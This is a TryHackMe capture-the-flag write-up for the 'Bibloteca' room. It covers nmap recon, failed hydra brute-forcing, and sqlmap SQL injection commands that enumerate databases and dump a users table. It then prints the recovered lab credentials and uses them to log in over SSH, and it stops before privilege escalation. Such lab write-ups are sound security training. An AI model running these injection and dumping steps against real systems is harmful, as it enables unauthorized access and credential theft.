---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/bibloteca/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-24T11:00:25.212+02:00","updated":"2026-04-26T11:31:43.947+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
---

![](/img/user/Attachments/redteaming2.png)

--------
## Description


---------
## Recon

As always a full nmap scan is required to discover running services and active ports on the system. 

![](/img/user/Attachments/nmap1%201.png)

Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 

![](/img/user/Attachments/nmap2%201.png)


-------
## Enumeration


![](/img/user/Attachments/homepage%203.png)

While fuzzing the webapp for hidden endpoints nothing really came up. The Nmap scan shows 2 open ports **22 for SSH** and **8000** for a webserver. Nothing much to go on on the web server. It is possible to create an account. However there is a hint from the THM instructions. **Hit em with the classics***  so let's do that.

![](/img/user/Attachments/session-managemenet.png)

Initially first thing which came to mind was to brute-force the username/password with hydra. Session management is confirmed by the use of cookies. Initially attempting focusing on doing dictionary attacks on the login page and the ssh service was not a success. I tried many different wordlists without any luck. Finally, moving to a different attack vector `sqlmap`
it was a success. 

---

## Exploitation

### SQL Injection

Target is vulnerable to sqli injection. 

```bash
sqlmap --batch -r login.req --level=5
```


![](/img/user/Attachments/sqlmmap-success.png)

Target is vulnerable to sqli injection. So, from the sqlmap tool the payload is given. Let's use that  to authenticate on the login page. 

```bash
sqlmap --batch -r login.req --level=5 --dbs
```

Let's look for the databases.

![](/img/user/Attachments/dbs.png)

```bash
sqlmap --batch -r login.req --level=5 -D website --tables
```

Let's choose `website` database and enumerate the tables.

![](/img/user/Attachments/users.png)


```bash
sqlmap --batch -r login.req --level=5 -D website -T users --dump
```

It's looking good so far. Let's dump the contents.

![](/img/user/Attachments/sql-jackpot.png)

So, it's a success. Account credentials are retrieved. Let's use these creds to authenticate on the web server.

```bash

# Credentials

username: smokey
email: smokey@email.boop
password: My_P@ssW0rd123

```


![](/img/user/Attachments/smokey-login.png)

The credentials work but no flag is seen on smokey's dashboard. 

> Moving to Post Exploitation

----
## Post-exploitation

```bash
sqlmap --batch -r login.req --level=5 -D information_schema --tables
```

Let's have a look at the `information_schema`. 

```
ADMINISTRABLE_ROLE_AUTHORIZATIONS     |  
| APPLICABLE_ROLES                      |  
| CHARACTER_SETS                        |  
| CHECK_CONSTRAINTS                     |  
| COLLATIONS                            |  
| COLLATION_CHARACTER_SET_APPLICABILITY |  
| COLUMNS_EXTENSIONS                    |  
| COLUMN_PRIVILEGES                     |  
| COLUMN_STATISTICS                     |  
| ENABLED_ROLES                         |  
| FILES                                 |  
| INNODB_BUFFER_PAGE                    |  
| INNODB_BUFFER_PAGE_LRU                |  
| INNODB_BUFFER_POOL_STATS              |  
| INNODB_CACHED_INDEXES                 |  
| INNODB_CMP                            |  
| INNODB_CMPMEM                         |  
| INNODB_CMPMEM_RESET                   |  
| INNODB_CMP_PER_INDEX                  |  
| INNODB_CMP_PER_INDEX_RESET            |  
| INNODB_CMP_RESET                      |  
| INNODB_COLUMNS                        |  
| INNODB_DATAFILES                      |  
| INNODB_FIELDS                         |  
| INNODB_FOREIGN                        |  
| INNODB_FOREIGN_COLS                   |  
| INNODB_FT_BEING_DELETED               |  
| INNODB_FT_CONFIG                      |  
| INNODB_FT_DEFAULT_STOPWORD            |  
| INNODB_FT_DELETED                     |  
| INNODB_FT_INDEX_CACHE                 |  
| INNODB_FT_INDEX_TABLE                 |  
| INNODB_INDEXES                        |  
| INNODB_METRICS                        |  
| INNODB_SESSION_TEMP_TABLESPACES       |  
| INNODB_TABLES                         |  
| INNODB_TABLESPACES                    |  
| INNODB_TABLESPACES_BRIEF              |  
| INNODB_TABLESTATS                     |  
| INNODB_TEMP_TABLE_INFO                |  
| INNODB_TRX                            |  
| INNODB_VIRTUAL                        |  
| KEYWORDS                              |  
| KEY_COLUMN_USAGE                      |  
| OPTIMIZER_TRACE                       |  
| PARAMETERS                            |  
| PROFILING                             |  
| REFERENTIAL_CONSTRAINTS               |  
| RESOURCE_GROUPS                       |  
| ROLE_COLUMN_GRANTS                    |  
| ROLE_ROUTINE_GRANTS                   |  
| ROLE_TABLE_GRANTS                     |  
| ROUTINES                              |  
| SCHEMATA                              |  
| SCHEMATA_EXTENSIONS                   |  
| SCHEMA_PRIVILEGES                     |  
| STATISTICS                            |  
| ST_GEOMETRY_COLUMNS                   |  
| ST_SPATIAL_REFERENCE_SYSTEMS          |  
| ST_UNITS_OF_MEASURE                   |  
| TABLESPACES                           |  
| TABLESPACES_EXTENSIONS                |  
| TABLES_EXTENSIONS                     |  
| TABLE_CONSTRAINTS                     |  
| TABLE_CONSTRAINTS_EXTENSIONS          |  
| TABLE_PRIVILEGES                      |  
| USER_ATTRIBUTES                       |  
| USER_PRIVILEGES                       |  
| VIEWS                                 |  
| VIEW_ROUTINE_USAGE                    |  
| VIEW_TABLE_USAGE                      |  
| COLUMNS                               |  
| ENGINES                               |  
| EVENTS                                |  
| PARTITIONS                            |  
| PLUGINS                               |  
| PROCESSLIST                           |  
| TABLES                                |  
| TRIGGERS                              |  
+---------------------------------------+
```

Dumping the tables in the information_schema can potentially reveal valuable information. Realizing I havent tried the credentials for SSH yet im going to do that before further enumerating the information_schema.

### SSH 

```bash
ssh smokey@TARGET 
```

![](/img/user/Attachments/smokey-ssh.png)


The credentials work for SSH. Let's check out the classics. The directory for smokey is empty. 

![](/img/user/Attachments/existingusers.png)

So, there are other users on the system. **hazel**. Let's see if its possible to explore. 

![](/img/user/Attachments/hazel-directory.png)


So, **root** can read/write these files. and **hazel** can read both files. For everyone else its **permission denied**. Sadly. Time for some linux priv escalation classics.



------
## Attack Pattern Analysis (APA)